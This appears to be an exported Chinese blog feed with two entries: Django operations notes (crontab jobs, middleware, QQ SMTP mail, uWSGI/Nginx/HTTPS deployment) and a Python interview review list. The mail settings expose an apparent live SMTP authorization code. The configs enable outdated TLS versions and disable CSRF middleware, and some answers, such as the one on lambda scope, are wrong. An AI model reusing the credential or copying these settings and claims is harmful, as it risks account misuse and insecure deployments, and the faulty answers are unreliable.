<h3 id="Django-crontab-定时服务"><a href="#Django-crontab-定时服务" class="headerlink" title="Django crontab 定时服务"></a>Django crontab 定时服务</h3><h4 id="Linux下的crontab命令"><a href="#Linux下的crontab命令" class="headerlink" title="Linux下的crontab命令"></a>Linux下的crontab命令</h4><p>用于提交和管理用户的周期性任务<br>crond进程每分钟定时检查<br>时间间隔<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eg：</span><br><span class="line">minutes hours day month week command</span><br><span class="line">*/5 * * * * echo &apos;Hi&apos; &gt;/dev/nul：每隔五分钟执行一次</span><br><span class="line">0 12 * * * do something：每天12点整执行一次</span><br><span class="line">0 12 * * 1-5 do something：周一到周五每天12点整执行一次</span><br></pre></td></tr></table></figure></p>
<h4 id="django-crontab插件的使用"><a href="#django-crontab插件的使用" class="headerlink" title="django-crontab插件的使用"></a>django-crontab插件的使用</h4><p>pip 安装 </p>
<p>seetings.py<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    &apos;django.contrib.admin&apos;,</span><br><span class="line">    &apos;django.contrib.auth&apos;,</span><br><span class="line">    &apos;django.contrib.contenttypes&apos;,</span><br><span class="line">    &apos;django.contrib.sessions&apos;,</span><br><span class="line">    &apos;django.contrib.messages&apos;,</span><br><span class="line">    &apos;django.contrib.staticfiles&apos;,</span><br><span class="line"></span><br><span class="line">    # 新应用</span><br><span class="line">    &apos;apis.apps.ApisConfig&apos;,</span><br><span class="line">    &apos;authorization.apps.AuthorizationConfig&apos;,</span><br><span class="line"></span><br><span class="line">    # 第三方应用</span><br><span class="line">    &apos;django_crontab&apos;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">CRONJOBS = [</span><br><span class="line">    (&apos;*/1 * * * *&apos;, &apos;cron.jobs.demo&apos;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python manage.py crontab add</span><br><span class="line">python manage.py crontab show/remove/run</span><br><span class="line">crontab -l</span><br><span class="line">tail -f service.log</span><br></pre></td></tr></table></figure>
<p>说明：配置-&gt;crontab add（提交）-&gt; Django crontab插件 -定时任务-&gt; Linux crond服务 -负责执行-&gt;</p>
<h3 id="Django-中间件"><a href="#Django-中间件" class="headerlink" title="Django 中间件"></a>Django 中间件</h3><h4 id="什么是Django中间件"><a href="#什么是Django中间件" class="headerlink" title="什么是Django中间件"></a>什么是Django中间件</h4><p>Django中间件是一个类<br>请求前后在合适的时机执行相应方法<br>配置MIDDLEWARE CLASSES属性</p>
<p>SecurityMiddleware：安全中间件<br>GzipMiddleware:Gzip压缩中间件<br>SessionMiddleware：状态服务Session中间件<br>CsrfViewMiddleware：防止跨站伪造请求的中间件<br>AuthorizationMiddleware:Django自带的认证体系中间件<br>MessageMiddleware：消息中间件</p>
<h4 id="Django-中间件的执行逻辑"><a href="#Django-中间件的执行逻辑" class="headerlink" title="Django 中间件的执行逻辑"></a>Django 中间件的执行逻辑</h4><p>每个请求都会两次经过配置的中间件<br>多个中间件之间存在执行顺序</p>
<p><img data-src="http://tuchuang.xchcloud.cn/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%89%A7%E8%A1%8C%E9%80%BB%E8%BE%91.png" alt="中间件执行逻辑"><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MIDDLEWARE = [</span><br><span class="line">    &apos;django.middleware.security.SecurityMiddleware&apos;,</span><br><span class="line">    &apos;django.contrib.sessions.middleware.SessionMiddleware&apos;,</span><br><span class="line">    &apos;django.middleware.common.CommonMiddleware&apos;,</span><br><span class="line">    # &apos;django.middleware.csrf.CsrfViewMiddleware&apos;,</span><br><span class="line">    &apos;ops.middlewaredemo.TestMiddleware&apos;,</span><br><span class="line">    &apos;django.contrib.auth.middleware.AuthenticationMiddleware&apos;,</span><br><span class="line">    &apos;django.contrib.messages.middleware.MessageMiddleware&apos;,</span><br><span class="line">    &apos;django.middleware.clickjacking.XFrameOptionsMiddleware&apos;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
<h4 id="实现自定义中间件"><a href="#实现自定义中间件" class="headerlink" title="实现自定义中间件"></a>实现自定义中间件</h4><p>在每个请求前后打印log<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import logging</span><br><span class="line">logger = logging.getLogger(&apos;django&apos;)</span><br><span class="line">class TestMiddleware:</span><br><span class="line">    def __init__(self, get_response):</span><br><span class="line">        self.get_response = get_response</span><br><span class="line">        logger.info(&quot;Build TestMiddleware&quot;)</span><br><span class="line">    def __call__(self, request):</span><br><span class="line">        logger.info(&quot;TestMiddleware before request.&quot;)</span><br><span class="line">        response = self.get_response(request)</span><br><span class="line">        logger.info(&quot;TestMiddleware after request.&quot;)</span><br><span class="line">        return response</span><br></pre></td></tr></table></figure></p>
<h3 id="邮件模块"><a href="#邮件模块" class="headerlink" title="邮件模块"></a>邮件模块</h3><h4 id="QQ邮箱SMTP服务与授权码"><a href="#QQ邮箱SMTP服务与授权码" class="headerlink" title="QQ邮箱SMTP服务与授权码"></a>QQ邮箱SMTP服务与授权码</h4><p>简单邮件传输协议（Simple Mail Transfer Protocol）<br>SMTP服务使用TCP端口25<br>使用QQ邮箱SMTP服务需要授权码</p>
<h4 id="配置并使用标准库发送邮件"><a href="#配置并使用标准库发送邮件" class="headerlink" title="配置并使用标准库发送邮件"></a>配置并使用标准库发送邮件</h4><p>seetings.py<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Email config</span><br><span class="line"># QQ邮箱 SMTP 服务器地址</span><br><span class="line">EMAIL_HOST = &apos;smtp.qq.com&apos;</span><br><span class="line"># 端口</span><br><span class="line">EMAIL_PORT = 465</span><br><span class="line"># 发送邮件的邮箱</span><br><span class="line">EMAIL_HOST_USER = &apos;******@qq.com&apos;</span><br><span class="line"># 在邮箱中设置的客户端授权密码</span><br><span class="line">EMAIL_HOST_PASSWORD = &apos;anzthepddgaldafi&apos;</span><br><span class="line"># 开启TLS</span><br><span class="line">EMAIL_USE_TLS = True</span><br><span class="line"># 收件人看到的发件人</span><br><span class="line">EMAIL_FROM = &apos;******@qq.com&apos;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def send_mail():</span><br><span class="line">    msg = MIMEText(&quot;邮件通道测试&quot;, &quot;plain&quot;, &quot;utf-8&quot;)</span><br><span class="line">    msg[&apos;FROM&apos;] = &quot;Mail Test&quot;</span><br><span class="line">    msg[&apos;Subject&apos;] = &quot;【Mail Test】&quot;</span><br><span class="line">    receivers = [&apos;************@qq.com&apos;]</span><br><span class="line">    server = smtplib.SMTP_SSL(settings.EMAIL_HOST, settings.EMAIL_PORT)</span><br><span class="line">    server.set_debuglevel(1)</span><br><span class="line">    server.login(settings.EMAIL_HOST_USER, settings.EMAIL_HOST_PASSWORD)</span><br><span class="line">    server.sendmail(settings.EMAIL_FROM, receivers, msg.as_string())</span><br><span class="line">    server.close()</span><br><span class="line">```   </span><br><span class="line"></span><br><span class="line">### 基于邮件通知的服务监控和告警系统</span><br><span class="line"></span><br><span class="line">配置专用日志格式器记录耗时</span><br><span class="line">编写请求耗时统计功能的中间件</span><br><span class="line">配置定时任务统计指标并通过邮件发送</span><br><span class="line"></span><br><span class="line">![邮件告警](http://tuchuang.xchcloud.cn/%E9%82%AE%E4%BB%B6%E5%91%8A%E8%AD%A6.png)</span><br><span class="line"></span><br><span class="line">## 运维提升专题之部署篇</span><br><span class="line"></span><br><span class="line">![高可用](http://tuchuang.xchcloud.cn/%E9%AB%98%E5%8F%AF%E7%94%A8.png)</span><br><span class="line"></span><br><span class="line">### Django依赖服务的高可用</span><br><span class="line"></span><br><span class="line">#### 依赖服务高可用的问题</span><br><span class="line"></span><br><span class="line">#### 解决依赖服务单点故障的方法</span><br><span class="line"></span><br><span class="line">### Nginx必知必会</span><br><span class="line"></span><br><span class="line">#### Nginx概述</span><br><span class="line"></span><br><span class="line">网站服务器、反向代理器、负载均衡器</span><br><span class="line"></span><br><span class="line">#### Nginx 安装与基本命令</span><br><span class="line"></span><br><span class="line">默认配置目录：/etc/nginx</span><br><span class="line"></span><br><span class="line">sudo nginx -s stop</span><br><span class="line">sudo nginx -s quit</span><br><span class="line">sudo nginx -s reload(重新加载配置文件)</span><br><span class="line">sudo nginx -s reopen(重新打开日志文件)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### Nginx 关键配置模块</span><br><span class="line"></span><br><span class="line">events 配置域：网络连接相关配置（I/O模型等）</span><br><span class="line">server 配置域：相关服务节点配置</span><br><span class="line">location 配置域：资源路由配置</span><br><span class="line"></span><br><span class="line">http 配置域：Nginx作为网页服务器时的配置（#mail）</span><br><span class="line">upstream 配置域：反向代理配置域</span><br><span class="line"></span><br><span class="line">异步事件处理模型VS多线程客户机处理模型</span><br><span class="line">模块化设计、丰富模块库</span><br><span class="line">俄罗斯开发者开发的服务器</span><br><span class="line">异步事件处理模型：更高并发</span><br><span class="line">模块化设计、丰富的模块库</span><br><span class="line"></span><br><span class="line">### uWSGl必知必会</span><br><span class="line"></span><br><span class="line">全称：Web Server Gateway Interface</span><br><span class="line">Web Server 和Web Application 通信的规范</span><br><span class="line"></span><br><span class="line">![WSGI](http://tuchuang.xchcloud.cn/WSGI.png)</span><br><span class="line"></span><br><span class="line">实现了WSGl协议</span><br><span class="line">Web服务器</span><br><span class="line">接收客户端请求通过协议传达给Django应用</span><br><span class="line"></span><br><span class="line">pip install uwsgi</span><br><span class="line"></span><br><span class="line">chdir:WSGI应用目录</span><br><span class="line">module:WSGI应用的模块名字</span><br><span class="line">processes:uWSGl 进程数</span><br><span class="line">（http-）socket：套接字路径、地址</span><br><span class="line">max-requests：最大并发请求数</span><br><span class="line">vacuum：清理环境配置（Boolean）</span><br><span class="line"></span><br><span class="line">启动方法：</span><br><span class="line"></span><br><span class="line">uwsgi --chdir xxxx --socket:80 --max-requests 5000 --processes 4 --module xxx.wsgi</span><br><span class="line"></span><br><span class="line">配置文件启动</span><br><span class="line"></span><br><span class="line">停止：</span><br><span class="line"></span><br><span class="line">uwsgi --stop pid/uwsgi-8000.pid</span><br><span class="line"></span><br><span class="line">### Django uWSGI部署</span><br><span class="line"></span><br><span class="line">Django runserver 可以直接对外服务，但只是用于测试</span><br><span class="line">uWSGI可以很好的进行多线程调度、进程监控</span><br><span class="line">uWSGl 提供完善的请求日志处理</span><br><span class="line"></span><br><span class="line">uwsgi --http :8000 --module django_deployment.wsgi</span><br><span class="line"></span><br><span class="line">uwsgi --ini django-uwsgi.ini</span><br><span class="line"></span><br><span class="line">django-uwsgi.ini：</span><br></pre></td></tr></table></figure>
<p>[uwsgi]</p>
<p>chdir       = /home/ubuntu/jarvis/deployment/django_deployment<br>module      = django_deployment.wsgi<br>http-socket = :8000<br>master      = True<br>processes   = 4<br>threads     = 1<br>vacuum      = true</p>
<h1 id="backend-run-uwsgi"><a href="#backend-run-uwsgi" class="headerlink" title="backend run uwsgi"></a>backend run uwsgi</h1><p>daemonize   = %(chdir)/log/uwsgi-8000.log<br>log-maxsize = 1024000000<br>pidfile     = %(chdir)/pid/uwsgi-8000.pid<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### Django Nginx+uWSGl部署</span><br><span class="line"></span><br><span class="line">知名服务器，Nginx提供更加安全的服务保障</span><br><span class="line">提供反向代理、负载均衡等丰富功能</span><br><span class="line">对于静态文件的处理能力更强</span><br><span class="line"></span><br><span class="line">uWSGl 启动Django应用服务</span><br><span class="line">修改Nginx配置文件，完成反向代理配置</span><br><span class="line">收集静态文件，完成静态文件寻址配置</span><br><span class="line"></span><br><span class="line">Nginx：软连接</span><br><span class="line">ln -s sites-available/nginx-uwsgi.conf nginx.conf</span><br><span class="line"></span><br><span class="line">ll nginx.conf</span><br><span class="line"></span><br><span class="line">静态文件处理：</span><br><span class="line"></span><br><span class="line">python manage.py collectstatic</span><br><span class="line"></span><br><span class="line">nginx.conf location 指定地址</span><br><span class="line"></span><br><span class="line">### Django HTTPS部署</span><br><span class="line"></span><br><span class="line">HTTPS协议使用443端口</span><br><span class="line">HTTPS协议加密报文传输内容</span><br><span class="line">HTTPS协议耗费CPU计算资源和时间</span><br><span class="line"></span><br><span class="line">部署方案：</span><br><span class="line"></span><br><span class="line">![](http://tuchuang.xchcloud.cn/Https%20%E9%83%A8%E7%BD%B2.png)</span><br></pre></td></tr></table></figure></p>
<pre><code>server {
        listen 80;
        server_name .dongcia.com;
        return     301 https://dongcia.com$request_uri;
}

server {
        listen 443 ssl;
        server_name .dongcia.com;
        charset utf-8;
        ssl_certificate     /etc/nginx/ssl/dongcia.com.crt;
        ssl_certificate_key /etc/nginx/ssl/dongcia.com.key;
    ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE

        access_log /var/log/nginx/nginx-uwsgi.log;

        location / {
               proxy_pass http://uwsgi;
        }

        location /static {
               alias /home/ubuntu/jarvis/deployment/django_deployment/static;
        }
}
</code></pre><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### 使用Nginx进行高可用服务部署</span><br><span class="line"></span><br><span class="line">#### 为什么需要部署高可用服务？</span><br><span class="line"></span><br><span class="line">![](http://tuchuang.xchcloud.cn/%E9%AB%98%E5%8F%AF%E7%94%A8%E5%8E%9F%E5%9B%A0.png)</span><br><span class="line"></span><br><span class="line">#### 反向代理</span><br><span class="line"></span><br><span class="line">![](http://tuchuang.xchcloud.cn/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86.png)</span><br><span class="line"></span><br><span class="line">![](http://tuchuang.xchcloud.cn/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%862.png)</span><br><span class="line"></span><br><span class="line">#### 负载均衡</span><br><span class="line"></span><br><span class="line">![](http://tuchuang.xchcloud.cn/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1.png)</span><br><span class="line">权重：</span><br></pre></td></tr></table></figure>
<p>upstream uwsgi {</p>
<pre><code>        # server 127.0.0.1:8000;
        server 127.0.0.1:8001 weight=3;
        server 127.0.0.1:8002 weight=1;
}
</code></pre><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#### 注意</span><br><span class="line"></span><br><span class="line">不要使用root权限启动uWSGI服务</span><br><span class="line"></span><br><span class="line">关闭uWSGl外网访问</span><br></pre></td></tr></table></figure>
<p>[uwsgi]</p>
<p>chdir       = /home/ubuntu/jarvis/deployment/django_deployment<br>module      = django_deployment.wsgi<br>http-socket = 127.0.0.1:8001<br>master      = True<br>processes   = 1<br>threads     = 1<br>vacuum      = true</p>
<h1 id="backend-run-uwsgi-1"><a href="#backend-run-uwsgi-1" class="headerlink" title="backend run uwsgi"></a>backend run uwsgi</h1><p>daemonize   = %(chdir)/log/uwsgi-8001.log<br>log-maxsize = 1024000000<br>pidfile     = %(chdir)/pid/uwsgi-8001.pid<br><code>`</code></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>python-复习笔记</title>
    <url>/python-%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="1、一行代码实现-1–100-之和"><a href="#1、一行代码实现-1–100-之和" class="headerlink" title="1、一行代码实现 1–100 之和"></a>1、一行代码实现 1–100 之和</h3><p><code>sum(range(0, 101))</code></p>
<h3 id="2、如何在一个函数内部修改全局变量"><a href="#2、如何在一个函数内部修改全局变量" class="headerlink" title="2、如何在一个函数内部修改全局变量"></a>2、如何在一个函数内部修改全局变量</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">num = 5</span><br><span class="line">def func():</span><br><span class="line">    global num</span><br><span class="line">    num = 4</span><br><span class="line">func()</span><br><span class="line">print(num)  # 4</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h3 id="3、列出-5-个常用-Python-标准库？"><a href="#3、列出-5-个常用-Python-标准库？" class="headerlink" title="3、列出 5 个常用 Python 标准库？"></a>3、列出 5 个常用 Python 标准库？</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">os：提供了不少与操作系统相关联的函数</span><br><span class="line">sys：通常用于命令行参数</span><br><span class="line">re：正则匹配</span><br><span class="line">math：数学运算</span><br><span class="line">datetime：处理日期时间</span><br></pre></td></tr></table></figure>
<h3 id="4、你常用哪些-Python-标准库"><a href="#4、你常用哪些-Python-标准库" class="headerlink" title="4、你常用哪些 Python 标准库"></a>4、你常用哪些 Python 标准库</h3><h3 id="5、如何合并两个字典？"><a href="#5、如何合并两个字典？" class="headerlink" title="5、如何合并两个字典？"></a>5、如何合并两个字典？</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name = &#123;&apos;name&apos;: &apos;Gage&apos;&#125;</span><br><span class="line">age = &#123;&apos;age&apos;: 25&#125;</span><br><span class="line">name.update(age)</span><br><span class="line">print(name)  # &#123;&apos;name&apos;: &apos;Gage&apos;, &apos;age&apos;: 25&#125;</span><br></pre></td></tr></table></figure>
<h3 id="6、谈下-Python-的-GIL？"><a href="#6、谈下-Python-的-GIL？" class="headerlink" title="6、谈下 Python 的 GIL？"></a>6、谈下 Python 的 GIL？</h3><h3 id="7、Python-实现列表去重的方法？"><a href="#7、Python-实现列表去重的方法？" class="headerlink" title="7、Python 实现列表去重的方法？"></a>7、Python 实现列表去重的方法？</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">num_list = [1, 3, 1, 5, 3, 6, 1]</span><br><span class="line">print([num for num in set(num_list)])  # [1, 3, 5, 6]</span><br></pre></td></tr></table></figure>
<h3 id="8、fun-args-kwargs-中的args-kwargs-什么意思？"><a href="#8、fun-args-kwargs-中的args-kwargs-什么意思？" class="headerlink" title="8、fun(args,kwargs)中的args, kwargs 什么意思？"></a>8、<strong>fun(args,kwargs)中的args, kwargs 什么意思？</strong></h3><h3 id="9、Python2-和-Python3-的-range（100）的区别？"><a href="#9、Python2-和-Python3-的-range（100）的区别？" class="headerlink" title="9、Python2 和 Python3 的 range（100）的区别？"></a>9、Python2 和 Python3 的 range（100）的区别？</h3><p><code>Python2 返回列表，Python3 返回迭代器，节约内存。</code></p>
<h3 id="10、生成一个-16-位的随机字符串？"><a href="#10、生成一个-16-位的随机字符串？" class="headerlink" title="10、生成一个 16 位的随机字符串？"></a>10、生成一个 16 位的随机字符串？</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">print(&apos;&apos;.join((random.choice(string.printable)) for i in range(16))) </span><br><span class="line">有问题，需要优化</span><br></pre></td></tr></table></figure>
<h3 id="11、一句话解释什么样的语言能够用装饰器"><a href="#11、一句话解释什么样的语言能够用装饰器" class="headerlink" title="11、一句话解释什么样的语言能够用装饰器?"></a>11、一句话解释什么样的语言能够用装饰器?</h3><p><code>函数可以作为参数传递</code></p>
<h3 id="12、Python-内建数据类型有哪些？"><a href="#12、Python-内建数据类型有哪些？" class="headerlink" title="12、Python 内建数据类型有哪些？"></a>12、Python 内建数据类型有哪些？</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">整型--int</span><br><span class="line">布尔型--bool</span><br><span class="line">字符串--str</span><br><span class="line">列表--list</span><br><span class="line">元组--tuple</span><br><span class="line">字典--dict</span><br></pre></td></tr></table></figure>
<h3 id="13、列表-1-2-3-4-5-，请使用-map-函数输出-1-4-9-16-25-，并使用列表推导式提取出大于-10-的数，最终输出-16-25-？"><a href="#13、列表-1-2-3-4-5-，请使用-map-函数输出-1-4-9-16-25-，并使用列表推导式提取出大于-10-的数，最终输出-16-25-？" class="headerlink" title="13、列表[1,2,3,4,5]，请使用 map() 函数输出[1,4,9,16,25]，并使用列表推导式提取出大于 10 的数，最终输出 [16,25]？"></a>13、列表[1,2,3,4,5]，请使用 map() 函数输出[1,4,9,16,25]，并使用列表推导式提取出大于 10 的数，最终输出 [16,25]？</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">num_list = [1, 2, 3, 4, 5]</span><br><span class="line">print([x for x in list(map(lambda x: x * x, num_list)) if x &gt; 10])</span><br></pre></td></tr></table></figure>
<h3 id="14、什么是匿名函数-lambda"><a href="#14、什么是匿名函数-lambda" class="headerlink" title="14、什么是匿名函数 lambda"></a>14、什么是匿名函数 lambda</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python 使用 lambda 来创建匿名函数。</span><br><span class="line"></span><br><span class="line">lambda只是一个表达式，函数体比def简单很多。</span><br><span class="line">lambda的主体是一个表达式，而不是一个代码块。仅仅能在lambda表达式中封装有限的逻辑进去。</span><br><span class="line">lambda函数拥有自己的命名空间，且不能访问自有参数列表之外或全局命名空间里的参数。</span><br><span class="line">虽然lambda函数看起来只能写一行，却不等同于C或C++的内联函数，后者的目的是调用小函数时不占用栈内存从而增加运行效率。</span><br><span class="line">语法</span><br></pre></td></tr></table></figure>
<p>lambda函数的语法只包含一个语句，如下：</p>
<p><code>lambda [arg1 [,arg2,.....argn]]:expression</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lambda 函数是一个可以接收任意多个参数(包括可选参数)并且返回单个表达式值的匿名函数</span><br><span class="line"></span><br><span class="line">好处：</span><br><span class="line">1、lambda 函数比较轻便，即用即删除，很适合需要完成一项功能，但是此功能只在此一处使用，</span><br><span class="line">连名字都很随意的情况下；</span><br><span class="line">2、匿名函数，一般用来给 filter， map 这样的函数式编程服务;</span><br><span class="line">3、作为回调函数，传递给某些应用，比如消息处理</span><br></pre></td></tr></table></figure></p>
<h3 id="15、map-函数的用法"><a href="#15、map-函数的用法" class="headerlink" title="15、map 函数的用法"></a>15、<strong>map 函数的用法</strong></h3><p>map() 会根据提供的函数对指定序列做映射。<br>map()函数接收两个参数，一个是函数，一个是Iterable，map将传入的函数依次作用到序列的每个元素，并把结果作为新的Iterator返回。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = map(ord,&apos;abcd&apos;)</span><br><span class="line">a</span><br><span class="line">&lt;map object at 0x03994E50&gt;</span><br><span class="line">list(a)</span><br><span class="line">[97, 98, 99, 100]</span><br><span class="line">next：返回可迭代对象中的下一个元素值</span><br></pre></td></tr></table></figure></p>
<h3 id="16、list-函数作用"><a href="#16、list-函数作用" class="headerlink" title="16、list 函数作用"></a>16、list 函数作用</h3><p>序列是Python中最基本的数据结构。序列中的每个元素都分配一个数字 - 它的位置，或索引，第一个索引是0，第二个索引是1，依此类推。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">访问</span><br><span class="line">更新：append</span><br><span class="line">删除：del</span><br><span class="line">脚本操作符：长度、组合、重复、元素是否存在于列表中、截取（第n个元素、倒数第n个元素、从第n个开始）</span><br><span class="line">函数：cmp(list1, list2)、len(list)、max(list)、min(list)、list(seq)</span><br><span class="line"></span><br><span class="line">list.append(obj)、list.count(obj)、list.extend(seq)：在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）</span><br><span class="line">list.index(obj)、list.insert(index, obj)：将对象插入列表</span><br><span class="line">list.pop([index=-1])：移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</span><br><span class="line">list.remove(obj)：移除列表中某个值的第一个匹配项</span><br><span class="line">list.reverse()：反向列表中元素</span><br><span class="line">list.sort(cmp=None, key=None, reverse=False)：对原列表进行排序</span><br></pre></td></tr></table></figure></p>
<h3 id="17、python-中生成随机整数、随机小数、0–1-之间小数方法？"><a href="#17、python-中生成随机整数、随机小数、0–1-之间小数方法？" class="headerlink" title="17、python 中生成随机整数、随机小数、0–1 之间小数方法？"></a>17、python 中生成随机整数、随机小数、0–1 之间小数方法？</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import random</span><br><span class="line">print(random.randint(1, 10))  # 随机整数</span><br><span class="line">print(random.random())  # 0-1随机小数</span><br><span class="line">print(random.uniform(2, 6)) # 指定范围[2-6]随机小数</span><br></pre></td></tr></table></figure>
<h3 id="18、避免转义给字符串加哪个字母表示原始字符串？"><a href="#18、避免转义给字符串加哪个字母表示原始字符串？" class="headerlink" title="18、避免转义给字符串加哪个字母表示原始字符串？"></a>18、避免转义给字符串加哪个字母表示原始字符串？</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b&apos;input\n&apos; # bytes字节符，打印以b开头。</span><br><span class="line">输出：</span><br><span class="line">b&apos;input\n&apos;</span><br><span class="line">--------------------------------------</span><br><span class="line">r&apos;input\n&apos; # 非转义原生字符，经处理&apos;\n&apos;变成了&apos;\\&apos;和&apos;n&apos;。也就是\n表示的是两个字符，而不是换行。</span><br><span class="line">输出：</span><br><span class="line">&apos;input\\n&apos;</span><br><span class="line">--------------------------------------</span><br><span class="line">u&apos;input\n&apos; # unicode编码字符，python3默认字符串编码方式。</span><br><span class="line">输出：</span><br><span class="line">&apos;input\n&apos;</span><br></pre></td></tr></table></figure>
<h3 id="19、-lt-div-class-quot-nam-quot-gt-Python-lt-div-gt-，用正则匹配出标签里面的内容（“Python”），其中-class-的类名是不确定的。"><a href="#19、-lt-div-class-quot-nam-quot-gt-Python-lt-div-gt-，用正则匹配出标签里面的内容（“Python”），其中-class-的类名是不确定的。" class="headerlink" title="19、&lt;div class=&quot;nam&quot;&gt;Python&lt;/div&gt;，用正则匹配出标签里面的内容（“Python”），其中 class 的类名是不确定的。"></a>19、<code>&lt;div class=&quot;nam&quot;&gt;Python&lt;/div&gt;</code>，用正则匹配出标签里面的内容（“Python”），其中 class 的类名是不确定的。</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">    s = &apos;&lt;div class=&quot;nam&quot;&gt;Python&lt;/div&gt;&apos;</span><br><span class="line">    print(re.findall(r&apos;&lt;div class=&quot;.*&quot;&gt;(.*?)&lt;/div&gt;&apos;, s)) #[&apos;Python&apos;]</span><br></pre></td></tr></table></figure>
<h3 id="20、Python-中断言方法举例？"><a href="#20、Python-中断言方法举例？" class="headerlink" title="20、Python 中断言方法举例？"></a>20、Python 中断言方法举例？</h3><p>Python assert（断言）用于判断一个表达式，在表达式条件为 false 的时候触发异常。</p>
<p>语法格式如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assert 后面也可以紧跟参数也可不加:</span><br><span class="line">assert expression [, arguments]</span><br><span class="line">等价于：</span><br><span class="line">if not expression:</span><br><span class="line">    raise AssertionError(arguments)</span><br></pre></td></tr></table></figure></p>
<h3 id="21、dict"><a href="#21、dict" class="headerlink" title="21、dict"></a>21、dict</h3><p>字典是另一种可变容器模型，且可存储任意类型对象。<br>字典的每个键值 key=&gt;value 对用冒号 : 分割，每个键值对之间用逗号 , 分割，整个字典包括在花括号 {} 中 。</p>
<p>在 Python 中，字典是通过哈希表实现的。也就是说，字典是一个数组，而数组的索引是键经过哈希函数处理后得到的。哈希函数的目的是使键均匀地分布在数组中。由于不同的键可能具有相同的哈希值，即可能出现冲突，高级的哈希函数能够使冲突数目最小化。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">访问</span><br><span class="line">修改</span><br><span class="line">删除：del、clear</span><br><span class="line"></span><br><span class="line">内置函数：cmp(dict1, dict2)、len(dict)、str(dict)：输出字典可打印的字符串表示。</span><br><span class="line">type(variable)：返回输入的变量类型，如果变量是字典就返回字典类型。</span><br><span class="line"></span><br><span class="line">dict.clear()</span><br><span class="line">dict.has_key(key)</span><br><span class="line">dict.copy()：返回一个字典的浅复制</span><br><span class="line">dict.fromkeys(seq[, val])：创建一个新字典，以序列 seq 中元素做字典的键，val 为字典所有键对应的初始值</span><br><span class="line">dict.get(key, default=None)：返回指定键的值，如果值不在字典中返回default值</span><br><span class="line">dict.setdefault(key, default=None)：和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default</span><br><span class="line">dict.items()：**以列表**返回可遍历的(键, 值) 元组数组</span><br><span class="line">dict.keys()：**以列表**返回一个字典所有的键</span><br><span class="line">dict.update(dict2)：把字典dict2的键/值对更新到dict里</span><br><span class="line">dict.values()：**以列表**返回字典中的所有值</span><br><span class="line">pop(key[,default])：删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</span><br><span class="line">popitem()：返回并删除字典中的最后一对键和值。</span><br></pre></td></tr></table></figure>
<h3 id="22、什么是浅拷贝、深拷贝"><a href="#22、什么是浅拷贝、深拷贝" class="headerlink" title="22、什么是浅拷贝、深拷贝"></a>22、什么是浅拷贝、深拷贝</h3><p>浅拷贝：也就是拷贝A对象里面的数据，但是不拷贝A对象里面的子对象<br>深拷贝：会克隆出一个对象，数据相同，但是引用地址不同（就是拷贝A对象里面的数据，而且拷贝它里面的子对象）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># copy</span><br><span class="line">l1 = [1, 2, [3, 4]]</span><br><span class="line">l2 = copy.copy(l1)</span><br><span class="line">l1.append(5)</span><br><span class="line">l1[2].append(5)  # 子对象 改变</span><br><span class="line">print(l1)</span><br><span class="line">print(l2)</span><br><span class="line">--------------</span><br><span class="line">[1, 2, [3, 4, 5], 5]</span><br><span class="line">[1, 2, [3, 4, 5]]</span><br><span class="line"># deepcopy</span><br><span class="line">l1 = [1, 2, [3, 4]]</span><br><span class="line">l2 = copy.deepcopy(l1)</span><br><span class="line">l1.append(5)</span><br><span class="line">l1[2].append(5)</span><br><span class="line">print(l1)</span><br><span class="line">print(l2)</span><br><span class="line">--------------</span><br><span class="line">[1, 2, [3, 4, 5], 5]</span><br><span class="line">[1, 2, [3, 4]]</span><br></pre></td></tr></table></figure></p>
